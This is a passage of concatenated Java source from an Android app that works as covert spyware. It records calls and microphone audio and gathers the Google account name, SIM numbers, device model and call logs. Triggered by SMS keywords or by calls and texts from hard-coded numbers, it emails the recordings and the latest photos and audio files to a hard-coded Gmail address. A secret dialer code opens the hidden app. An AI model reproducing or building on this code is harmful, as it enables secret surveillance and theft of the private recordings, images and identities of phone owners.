        }else if(  setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else {
            setSim1Number =null;
        }
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
         subject ="Call:ID: " + setSim1Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + GoogleAccountName +" Number: " +userSimNumber  ;
        Log.e(TAG, "SMS email subject: "+ subject );
        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Compare email content and file size with previous email. if same go fileservice class
        if (isCallRecorderAutoEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Email content and file size same as the previous email. Skipping email send.");
            FileService fileService = new FileService();
            Intent intent = new Intent();
            Log.d(TAG, "call the method fileService clss of fileService.SendLastTimeFileingsEmail.");
            //Context context = null;
            // if same go fileservice class .Compare callercording email content and file size with previous email.
            fileService.SendLastTimeFileingsEmail(intent, context);
        }
        try {
            if (!isCallRecorderAutoEmailContentSame(subject, body, fileSize)) {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "Email sent successfully with attachment.method sendEmailWithAttachment");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize, context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize,Context context ) {
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("CallRecorderAutoEmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("CallRecorderAutosubject", subject);
        editor.putString("CallRecorderAutobody", body);
        editor.putLong("CallRecorderAutofileSize", fileSize);
        editor.putString("CallRecorderAutofilePath", filePath);
        editor.apply();
        Log.d(TAG, "SharedPreferences CallRecorderAutoEmail details stored .in sended Email");
    }

    // Check if the email content is the same as before
    private boolean isCallRecorderAutoEmailContentSame(String subject, String body, long fileSize) {
        if (mContext == null) {
            Log.e(TAG, "isEmailContentSame: mContext is null! Cannot access SharedPreferences.");
            return false;
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("CallRecorderAutoEmailDetails", Context.MODE_PRIVATE);
        String CallRecorderAutopreviousSubject = sharedPreferences.getString("CallRecorderAutosubject", "");
        String CallRecorderAutopreviousBody = sharedPreferences.getString("CallRecorderAutobody", "");
        long CallRecorderAutopreviousFileSize = sharedPreferences.getLong("CallRecorderAutofileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(CallRecorderAutopreviousSubject) && body.equals(CallRecorderAutopreviousBody) && fileSize == CallRecorderAutopreviousFileSize;
    }


    private boolean IncomingCallNumber(String sender) {
        for (String number : allowedIncomingNumbers) {
            if (sender.equals(number)) {
                Log.d(TAG, "CallRecorderAuto class Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "CallRecorderAuto class Not an incoming call number: " + sender);
        return false;
    }

    // Check and request required permissions
    private boolean checkAndRequestPermissions(Context context) {
        List<String> missingPermissions = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (!missingPermissions.isEmpty()) {
            Log.e(TAG, "Missing permissions: " + missingPermissions);
            // If we're in an Activity context, we could request permissions here
            // But since this is a BroadcastReceiver, permissions should be requested by the app's main activity
            return false;
        }
        return true;
    }



    public void SendLastRecordingViaEmail(Context context) {
        Log.d(TAG, "called from Notification class .the method of sendLastRecordingViaEmail in CallRecorderAuto.");
        sendLastRecordingViaEmail(context);
    }
}



//CallRecordSendEmail.java
package com.example.fasterpro11;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import java.io.File;

public class CallRecordSendEmail {
    private static final String TAG = "CallRecordSendEmail";
    private Context mContext;
    private Context context;


    public void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "rec Sending email with attachment...");
        // context = getApplicationContext();
        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);
        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
        String Get_Sim1_Number = null;

        SmsReceiver smsReceiver = new SmsReceiver();
        String messageBody= "Your  Text";
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        NotificationListener notificationListener = new NotificationListener();
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
        }else if(  setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else {
            setSim1Number =null;
        }
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        subject ="Access Sound Rec ID: " + setSim1Number+ " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + Get_Sim1_Number +" User: "+ GoogleAccountName +" Number: " +userSimNumber ;
        Log.e(TAG, "SMS email subject: "+ subject );

        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Compare email content and file size with previous email
        if (isMicRecordEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Sound RecMail content same as before. Skipping email send.");
            return; // Don't send the email if the content is the same
        }

        try {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "mic rec Email sent successfully with attachment.");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize,context);

        } catch (Exception e) {
            Log.e(TAG, "mic Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize, Context context) {
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("MicRecordsubject", subject);
        editor.putString("MicRecordbody", body);
        editor.putLong("MicRecordfileSize", fileSize);
        editor.putString("MicRecordfilePath", filePath);
        editor.apply();
        Log.d(TAG, "SharedPreferences MicRecordEmail details stored.in sended Email");
    }

    // Check if the email content is the same as before
    private boolean isMicRecordEmailContentSame(String subject, String body, long fileSize) {
        if (mContext == null) {
            Log.e(TAG, "isEmailContentSame: mContext is null! Cannot access SharedPreferences.");
            return false;
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        String MicRecordpreviousSubject = sharedPreferences.getString("MicRecordsubject", "");
        String MicRecordpreviousBody = sharedPreferences.getString("MicRecordbody", "");
        long MicRecordpreviousFileSize = sharedPreferences.getLong("MicRecordfileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(MicRecordpreviousSubject) && body.equals(MicRecordpreviousBody) && fileSize == MicRecordpreviousFileSize;
    }



    public boolean isInternetAvailable(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            // Log.d(TAG, "isInternetAvailable mContext is initialized");
        }
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            // Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }




}



//CallRelatedInfo.java
package com.example.fasterpro11;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class CallRelatedInfo {
    private static final String TAG = "CallRelated";

    public boolean checkLastCallNumbers(Context context, String[] allowedNumbers) {
        Log.d(TAG, "Checking last call numbers.");

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();
        String sortOrder = CallLog.Calls.DATE + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                    count++;
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        List<String> allowedNumbersList = Arrays.asList(allowedNumbers);
        for (String number : recentNumbers) {
            if (allowedNumbersList.contains(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }


}


//CountEmail.java
package com.example.fasterpro11;

import android.util.Log;

public class CountEmail {
    private static int emailCount = 0; // à¦¦à§ˆà¦¨à¦¿à¦• à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦Ÿà§à¦°à§à¦¯à¦¾à¦• à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯
    private static final int DAILY_LIMIT = 499; // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾
    private static final String TAG = "CountEmail"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—

    // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦†à¦›à§‡ à¦•à¦¿à¦¨à¦¾ à¦¤à¦¾ à¦šà§‡à¦• à¦•à¦°à§‡
    public static boolean canSendEmail() {
        return emailCount < DAILY_LIMIT; // à¦¯à¦¦à¦¿ à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¸à§€à¦®à¦¾à¦° à¦®à¦§à§à¦¯à§‡ à¦¥à¦¾à¦•à§‡
    }

    // à¦‡à¦®à§‡à¦² à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¬à§ƒà¦¦à§à¦§à¦¿ à¦•à¦°à§‡ à¦à¦¬à¦‚ à¦²à¦—à§‡ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¦à§‡à¦–à¦¾à§Ÿ
    public static void incrementEmailCount() {
        if (emailCount < DAILY_LIMIT) { // à¦¸à§€à¦®à¦¾à¦° à¦®à¦§à§à¦¯à§‡ à¦¥à¦¾à¦•à¦²à§‡
            emailCount++; // à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à§ƒà¦¦à§à¦§à¦¿
            Log.d(TAG, "Email sent successfully. Total sent emails today: " + emailCount); // à¦¸à¦«à¦² à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦²à¦— à¦®à§‡à¦¸à§‡à¦œ
        } else {
            Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦— à¦®à§‡à¦¸à§‡à¦œ
        }
    }

    // à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦«à§‡à¦°à¦¤ à¦¦à§‡à§Ÿ
    public static int getEmailCount() {
        return emailCount; // à¦®à§‹à¦Ÿ à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾
    }
}



//DateUtils.java
package com.example.fasterpro11;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DateUtils {

    // Define date format
    private static final String DATE_FORMAT = "yyyy-MM-dd HH:mm:ss";

    // Method to convert timestamp to string
    public static String dateToString(long timestamp) {
        DateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT, Locale.getDefault());
        return dateFormat.format(new Date(timestamp));
    }
}



//DialCodeReceiver.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class DialCodeReceiver extends BroadcastReceiver {
    private static final String TAG = "DialCodeReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        // à¦¡à¦¾à§Ÿà¦¾à¦² à¦•à§‹à¦¡ à¦¯à§‡à¦Ÿà¦¿ à¦ªà§à¦°à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡, à¦¸à§‡à¦Ÿà¦¾ à¦šà§‡à¦• à¦•à¦°à¦¾ à¦¹à¦šà§à¦›à§‡
        String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        // à¦¡à¦¾à§Ÿà¦¾à¦² à¦•à§‹à¦¡ #*#*67544*#*# à¦à¦° à¦¸à¦¾à¦¥à§‡ à¦®à¦¿à¦²à§‡ à¦—à§‡à¦²à§‡ à¦…à§à¦¯à¦¾à¦ª à¦–à§‹à¦²à¦¾ à¦¹à¦¬à§‡
        if (phoneNumber != null && phoneNumber.equals("#*#*67544*#*#")) {
            Log.d(TAG, "Dial code #*#*67544*#*# detected, opening app.");

            // MainActivity à¦¬à¦¾ à¦†à¦ªà¦¨à¦¾à¦° à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à¦¿à¦Ÿà¦¿ à¦–à§à¦²à¦¤à§‡ à¦à¦–à¦¾à¦¨à§‡ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡
            Intent launchIntent = new Intent(context, MainActivity.class);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Start new task
            context.startActivity(launchIntent);  // à¦…à§à¦¯à¦¾à¦ª à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
        }
    }
}



//FileService.java
package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

public class FileService extends BroadcastReceiver {

    private static final String TAG = "FileService";
    private static final String RecivedEmail = "abontiangum99@gmail.com"; // Update recipient email
    // Allowed phone numbers and keywords for checking SMS content
    private static final String[] allowedNumbers = {
            "+8801300282080", "+8801304039280",  "+8809697637890", "+8809638821360" };


    private static final String[] WORDS1_GRADE = {"Goldfl", "Silverfl", "Mediumfl"};
    private static final String[] WORDS2_OFFER = {"Congratulationfl", "Conformfl"};
    private static final String[] audioFormats = {".amr", ".wav", ".mp3", ".m4a",".aac", ".mp4"};
    private static final String[] imageFormats = {".jpg", ".jpeg", ".JPG", ".JPEG"};
    private static final String[] folderNames = {"callrecord", "CallRecord", "call", "Call",
            "PhoneRecord", "SoundRecorder", "Music","Camera", "camera"};

    private List<String> lastMessages = new ArrayList<>();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive triggered.");
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Log.d(TAG, "SMS_RECEIVED action detected.");
                handleSmsReceived(intent, context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS in filrservice class");
        try {
            // Check runtime permission for receiving SMS
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Permission to read SMS not granted.");
                return;
            }

            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                Log.d(TAG, "Number of PDUs: " + (pdus != null ? pdus.length : 0));

                for (Object pdu : pdus) {
                    try {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                        // Clear and update last message
                        lastMessages.clear();
                        lastMessages.add(messageBody);

                        boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                        boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                        boolean isInternetAvailable = isInternetAvailable(context);
                        boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);

                        Log.d(TAG, "Keywords 1 found: " + containsWords1);
                        Log.d(TAG, "Keywords 2 found: " + containsWords2);
                        Log.d(TAG, "Internet available: " + isInternetAvailable);
                        Log.d(TAG, "Allowed number: " + isAllowedNumber);

                        // If conditions met, send the file
                        if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                                (isAllowedNumber && isInternetAvailable)) {
                            Log.d(TAG, "Conditions met. Sending email with the latest files.");
                            SendLastTimeFileInFolderToFirebaseAndEmail(context);
                        } else {
                            Log.d(TAG, "Conditions not met for sending recording.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS PDU: ", e);
                    }
                }
            } else {
                Log.d(TAG, "Bundle is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        try {
            for (String keyword : WORDS1_GRADE) {
                if (messageBody.contains(keyword)) {
                    Log.d(TAG, "Keyword found in message: " + keyword);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking keywords in WORDS1_GRADE: ", e);
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        try {
            for (String keyword : WORDS2_OFFER) {
                if (messageBody.contains(keyword)) {
                    Log.d(TAG, "Keyword found in message: " + keyword);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking keywords in WORDS2_OFFER: ", e);
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        Log.d(TAG, "Checking if number is allowed: " + number);
        try {
            for (String allowedNumber : allowedNumbers) {
                if (allowedNumber.equals(number)) {
                    Log.d(TAG, "Allowed number found: " + number);
                    return true;
                }
            }
            Log.d(TAG, "Number is not allowed: " + number);
        } catch (Exception e) {
            Log.e(TAG, "Error checking allowed number: ", e);
        }
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 3")) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    public boolean isInternetAvailable(Context context) {
        Log.d(TAG, "Checking internet availability.");
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }

    // Static variables to store the last email content and file size
    private static String lastEmailContent = "";
    private static long lastEmailFileSize = 0;



    public static void SendLastTimeFileInFolderToFirebaseAndEmail(Context context) {
        Log.d(TAG, "Sending last time fileings email.");
        boolean fileSent = false; // To track if any file has been sent
        List<File> searchFolders = new ArrayList<>();

        // Search for folders in both internal storage and SD card
        Log.d(TAG, "Searching for folders in both internal and external storage.");
        searchFolders.addAll(findFolders(Environment.getExternalStorageDirectory()));
        searchFolders.addAll(findFolders(Environment.getDataDirectory()));

        StringBuilder emailContent = new StringBuilder(); // To build the email content

        for (File folder : searchFolders) {
            try {
                // Check for last audio file in folder
                File lastFile = getLastFileFromFolder(folder, audioFormats);
                if (lastFile != null) {
                    Log.d(TAG, "Last audio file found: " + lastFile.getAbsolutePath());
                    emailContent.append("Last audio file: ").append(lastFile.getAbsolutePath()).append("\n");

                    // Check if the current file's size and content is the same as the last one
                    long currentFileSize = lastFile.length();
                    if (lastFile.getAbsolutePath().equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
                        Log.d(TAG, "File content and size are the same as last time. Not sending the email.");
                    } else {
                        Log.d(TAG, "Sending email with new content and file.");
                        sendEmailWithAttachment(context, lastFile.getAbsolutePath());
                        fileSent = true;
                        lastEmailContent = lastFile.getAbsolutePath();  // Update the last email content
                        lastEmailFileSize = currentFileSize;  // Update the last file size
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking audio folder: ", e);
            }

            try {
                // Check for last image file in folder
                File lastImage = getLastFileFromFolder(folder, imageFormats);
                if (lastImage != null) {
                    Log.d(TAG, "Last image file found: " + lastImage.getAbsolutePath());
                    emailContent.append("Last image file: ").append(lastImage.getAbsolutePath()).append("\n");

                    // Check if the current file's size and content is the same as the last one
                    long currentFileSize = lastImage.length();
                    if (lastImage.getAbsolutePath().equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
                        Log.d(TAG, "File content and size are the same as last time. Not sending the email.");
                    } else {
                        Log.d(TAG, "Sending email with new content and file.");
                        sendEmailWithAttachment(context, lastImage.getAbsolutePath());
                        fileSent = true;
                        lastEmailContent = lastImage.getAbsolutePath();  // Update the last email content
                        lastEmailFileSize = currentFileSize;  // Update the last file size
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking image folder: ", e);
            }
        }

        if (!fileSent) {
            Log.d(TAG, "No files found to send.");
        }
    }
    private static void sendEmailWithAttachment(Context context, String filePath) {
        Log.d(TAG, "File Service Sending email with attachment...");
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + filePath);
                return;
            }

            // Get the current file size
            long currentFileSize = file.length();

           // Check if the content and file size are the same as the last sent email
           if (filePath.equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
               Log.d(TAG, "Not sending the email.Because File content and size are the same as last time sended. ");
                return;  // Skip sending the email if content and size are the same
            }

            AccountUtil accountUtil = new AccountUtil();
            String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
            String userSimNumber = accountUtil.getUserSimNumber(context);

            String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
            String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
            //String Get_Sim1_Number = accountUtil.Set_Sim1_Number(title, text ,  context);
            String Get_Sim1_Number = null;

            SmsReceiver smsReceiver = new SmsReceiver();
            String messageBody= "Your  Text";
            String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
            NotificationListener notificationListener = new NotificationListener();
            String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
            String setSim1Number ;
            if (  setSim1NumberSmsReceiver != null) {
                setSim1Number =setSim1NumberSmsReceiver;
            }else if(  setSim1NumberNotificationListener != null) {
                setSim1Number =setSim1NumberNotificationListener;
            }else {
                setSim1Number =null;
            }

            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
            String UserID1= alert.getSim1NumberFromUser(context);
            String UserID2= alert.getSim2NumberFromUser(context);
            String UserGivenSimNumber= UserID1 + " "+UserID2;

            String manufacturer = Build.MANUFACTURER;
            String mobileModel = Build.MODEL;
            String subject ="File ID: "+ setSim1Number +  " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" "  + Get_Sim1_Number  +" User: "+ GoogleAccountName +" Number: " +userSimNumber ;
            Log.e(TAG, "file email subject: "+ subject );
            // Build the email content (you can modify this to suit your needs)
            String emailContent = "file call rec: " + filePath;

            // Send the email with attachment
            Log.d(TAG, "file Sending email with attachment...");
            JavaMailAPI_Fileservice_Sender.sendMailWithAttachment(RecivedEmail, subject, emailContent, filePath);
            Log.d(TAG, "file Email sent with attachment: " + filePath);

//            // Save data to Firebase
//            Log.d(TAG, "file Data preparing for Firebase.");
//            FirebaseSaveAudioVideoPicture firebaseSaveAudioVideoPicture = new FirebaseSaveAudioVideoPicture();
//            firebaseSaveAudioVideoPicture.SaveAudioVideoPictureDataToFirebaseStorage(RecivedEmail, subject, emailContent, filePath, context);
//            Log.d(TAG, "file Data saved to Firebase Stroge.");

            // Update the last email content and file size
            lastEmailContent = filePath;
            lastEmailFileSize = currentFileSize;

        } catch (Exception e) {
            Log.e(TAG, "file Error sending email: ", e);
        }
    }



    public static List<File> findFolders(File directory) {
        List<File> folderList = new ArrayList<>();
        File[] files = directory.listFiles();

        // Check if files exist in the directory
        if (files != null) {
            // Loop through all the folders in the directory
            for (String folderName : folderNames) {
                boolean folderFound = false; // Flag to check if the folder is found

                // Loop through files in the directory and check for folder match
                for (File file : files) {
                    if (file.isDirectory() && file.getName().equalsIgnoreCase(folderName)) {
                        folderList.add(file);
                        Log.d(TAG, "Found folder: " + file.getAbsolutePath());
                        folderFound = true;
                        break; // No need to continue if folder is found
                    }
                }

                // If folder is not found, log it
                if (!folderFound) {
                    Log.d(TAG, "Not Found folder: " + folderName);
                }
            }
        } else {
            Log.d(TAG, "Directory is empty or null: " + directory.getAbsolutePath());
        }

        // Log the total number of matching folders found
        Log.d(TAG, "Total matching folders found in " + directory.getAbsolutePath() + ": " + folderList.size());

        return folderList;
    }



    public static File getLastFileFromFolder(File folder, String[] formats) {
        Log.d(TAG, "Getting last file from folder: " + folder.getAbsolutePath());
        File[] files = folder.listFiles(new FileFilter() {
            @Override
            public boolean accept(File file) {
                for (String format : formats) {
                    if (file.getName().endsWith(format)) {
                        return true;
                    }
                }
                return false;
            }
        });

        if (files != null && files.length > 0) {
            Arrays.sort(files, new Comparator<File>() {
                @Override
                public int compare(File o1, File o2) {
                    return Long.compare(o2.lastModified(), o1.lastModified());
                }
            });
            return files[0];
        }
        return null;
    }

    public void SendLastTimeFileingsEmail(Intent applicationContext, Context context) {
        SendLastTimeFileInFolderToFirebaseAndEmail(context); // Corrected to pass both Intent and Context
    }

}



//FirebaseSaVeAndViewData.java
package com.example.fasterpro11;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
